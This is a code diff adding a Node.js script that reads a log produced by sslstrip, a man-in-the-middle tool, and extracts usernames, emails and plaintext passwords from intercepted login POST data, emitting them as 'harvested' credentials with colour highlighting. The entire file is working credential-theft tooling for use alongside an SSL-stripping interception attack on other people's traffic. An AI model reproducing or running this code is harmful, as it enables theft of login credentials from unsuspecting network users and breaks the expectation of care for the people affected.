@@ -1,0 +1,80 @@
+#!/usr/bin/env node
+
+var lazy  = require("lazy"),
+      fs  = require("fs"),
+      clc = require('cli-color');
+   events = require('events');
+
+
+var exports = module.exports = new events.EventEmitter();
+
+exports.collect = function(){
+  setTimeout(function(){
+    new lazy(fs.createReadStream('lib/sslstrip.log'))
+       .lines
+       .forEach(function(line){
+         var username = '';
+         if (line.toString().indexOf('POST Data (') != -1) {
+           var match = line.toString()
+           match = match.substr(
+             match.indexOf('POST Data (')
+           ).replace('POST Data (','').replace('):','')
+           host = clc.white('~', match, '~')
+         }
+         if (line.toString().indexOf('loginfmt') != -1) {
+           var match = line.toString()
+           match = match.substr(match.indexOf('loginfmt'))
+           match = match.substr(0, match.indexOf('&'))
+           username = match.substr(match.indexOf('=')).substr(1)
+           username = clc.black.bgRed(username)
+         }
+         if (line.toString().indexOf('&passwd') != -1) {
+           var match = line.toString()
+           match = match.substr(match.indexOf('passwd'))
+           match = match.substr(0, match.indexOf('&'))
+           password = match.substr(match.indexOf('=')).substr(1)
+           exports.emit('harvested', '\n' + host + '\n\n' + decodeURIComponent(username) + '\n' + clc.black.bgRed.italic(password) + '\n');
+           //console.log('\n', host, '\n\n', decodeURIComponent(username), '\n', clc.black.bgRed.italic(password), '\n')
+         }
+         // EV
+         if (line.toString().indexOf('&userid') != -1) {
+           var match = line.toString()
+           match = match.substr(match.indexOf('userid'))
+           match = match.substr(0, match.indexOf('&'))
+           username = match.substr(match.indexOf('=')).substr(1)
+           username = clc.black.bgRed(username)
+         }
+         if (line.toString().indexOf('&password') != -1) {
+           var match = line.toString()
+           match = match.substr(match.indexOf('&password')).substr(1).replace('password', clc.blue('password'))
+           password = match.substr(match.indexOf('=')).substr(1)
+           var end = password.length
+           if (password.indexOf('&') > 0 )
+             end = password.indexOf('&')
+           password = password.substr(0, end)
+           if (username.length && password.length)
+             exports.emit('harvested', '\n' +  host +  '\n\n' +  decodeURIComponent(username) +  '\n' +  clc.black.bgRed.italic(password) + '\n');
+             //console.log('\n', host, '\n\n', decodeURIComponent(username), '\n', clc.black.bgRed.italic(password), '\n')
+         }
+         // EV
+         if (line.toString().indexOf('&email') != -1) {
+           var match = line.toString()
+           match = match.substr(match.indexOf('email'))
+           match = match.substr(0, match.indexOf('&'))
+           username = match.substr(match.indexOf('=')).substr(1)
+           username = clc.black.bgRed(username)
+         }
+         if (line.toString().indexOf('&password') != -1) {
+           var match = line.toString()
+           match = match.substr(match.indexOf('&password')).substr(1).replace('password', clc.blue('password'))
+           password = match.substr(match.indexOf('=')).substr(1)
+           var end = password.length
+           if (password.indexOf('&') > 0 )
+             end = password.indexOf('&')
+           password = password.substr(0, end)
+           exports.emit('harvested', '\n' +  host +  '\n\n' +  decodeURIComponent(username) +  '\n' +  clc.black.bgRed.italic(password) +  '\n');
+         }
+       }
+    );
+  },2000)
+}
